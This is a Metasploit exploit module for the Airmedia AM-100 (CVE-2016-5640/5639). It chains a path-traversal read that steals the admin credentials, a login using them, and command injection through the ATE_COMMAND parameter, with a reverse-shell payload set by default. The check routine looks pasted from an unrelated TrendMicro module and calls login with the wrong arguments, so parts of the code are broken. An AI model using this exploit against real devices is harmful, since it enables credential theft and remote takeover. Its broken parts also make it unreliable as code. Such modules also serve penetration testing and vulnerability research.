##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Airmedia AM-100 Remote Code Injection",
      'Description'    => %q{
        This module exploits a vulnerability found in where untrusted inputs are fed to system command, leading to command injection.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Quentin Kaiser <kaiserquentin[at]gmail.com>'
        ],
      'References'     =>
        [
          ['CVE', '2016-5640'],
          ['CVE', '2016-5639']
        ],
      'Platform'        => 'unix',
      'Targets'         => [ [ 'Airmedia AM-100', {} ] ],
      'Privileged'     => true,
      'DefaultOptions' =>
      {
        'SSL' => false,
        'PAYLOAD' => 'cmd/unix/reverse_openssl'
      },
      'Arch'  => [ ARCH_CMD ],
      'Payload' =>
      {
        'Compat' =>
        {
          'PayloadType' => 'cmd',
          'RequiredCmd' => 'openssl'
        }
      },
      'DisclosureDate' => "Aug 8 2016",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
        OptString.new('TARGETURI', [true, 'The base path', '/']),
      ])
  end


  def check
    opts = login
    if opts
      uri = target_uri.path
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(uri, "php/about.php?sid=#{opts['sid']}"),
        'headers'=>
        {
          'Cookie' => "#{opts["sid"]}=#{opts["sid_value"]}",
          'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.php",
          'Origin' =>  "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
        }
      })
      if res and res.code == 200
        version = res.body.to_s.scan(/MSG_ABOUT_VERSION <\/td>[^<]*<td[^>]*>([^<]*)</).last.first.to_f
        build = res.body.to_s.scan(/MSG_ABOUT_BUILD <\/td>[^<]*<td[^>]*><span[^>]*>([^<]*)</).last.first.to_i(10)
        print_status("TrendMicro Smart Protection Server detected.")
        print_status("Version: #{version}")
        print_status("Build: #{build}")
        if (version == 3.0 and build < 1330) or
          (version == 2.6 and build < 2106) or
          (version == 2.5 and build < 2200)
            return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Safe
        end
      end
    end
    Exploit::CheckCode::Unknown
  end


  def execute_command(cmd, opts = {})
    uri = target_uri.path
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html"),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'ATE_COMMAND' => cmd,
        'ATETXLEN' => 24,
        'ATE' => 'TXCONT'
      }
    })
  end

  def login(username, password)
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"),
      'ctype' => 'application/x-www-form-urlencoded',
      'data' => "login=#{username}&account=#{username}&password=#{password}"
    })
    if res and res.code == 200
      session_token = res.body.to_s.scan(/&([A-z0-9]{16})/).last.first.strip
      return session_token
    end
    return nil
  end

  def dump_creds
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, '/cgi-bin/login.cgi?lang=en&src=../../../../../../../../etc/content/AwDefault.xml'),
    })
    if res and res.code == 200
      admin_username = res.body.to_s.scan(/name=\"WEB_ADMIN_ID\".*?value=\"([^\"]*)\"/).last.first.strip
      admin_pass = res.body.to_s.scan(/name=\"LONG_ADMIN_PWD\".*?value=\"([^\"]*)\"/).last.first.strip
      return {"username":admin_username, "password":admin_pass}
    else
      return nil
    end
  end

  def exploit
    admin_creds = dump_creds
    if admin_creds
      print_good("Successfully dumped admin credentials: #{admin_creds}")
      token = login(admin_creds[:username], admin_creds[:password])
      if token
        print_good("Successfully authenticated. Token is #{token}.")
        print_status("Exploiting...")
        execute_command(payload.encoded, {'token' => token})
      else
        print_error("An error occured while login in with dumped credentials.")
      end
    else
      print_error("An error occurred while dumping creds. Not vulnerable ?")
    end
  end
end
